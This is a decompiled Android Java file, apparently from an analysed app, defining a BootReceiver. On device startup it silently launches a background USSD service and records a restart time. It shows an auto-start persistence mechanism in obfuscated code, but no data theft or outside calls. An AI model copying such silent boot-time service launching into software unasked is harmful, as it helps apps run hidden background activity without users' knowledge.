package com.network.android;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import com.network.android.c.a.a;
import com.network.ussd.CDUSSDService;

public class BootReceiver extends BroadcastReceiver {

    /* renamed from: a  reason: collision with root package name */
    public static String f39a = "";

    public void onReceive(Context context, Intent intent) {
        a.a("BootReceiver ussd: " + intent.getAction());
        try {
            a.a("startUssdService");
            context.startService(new Intent(context, CDUSSDService.class));
            SharedPreferences.Editor edit = context.getSharedPreferences("NetworkMessages", 0).edit();
            edit.putLong("restart", System.currentTimeMillis());
            edit.commit();
        } catch (Throwable th) {
            a.a("BootReceiver exception: " + th.getMessage(), th);
        }
    }
}
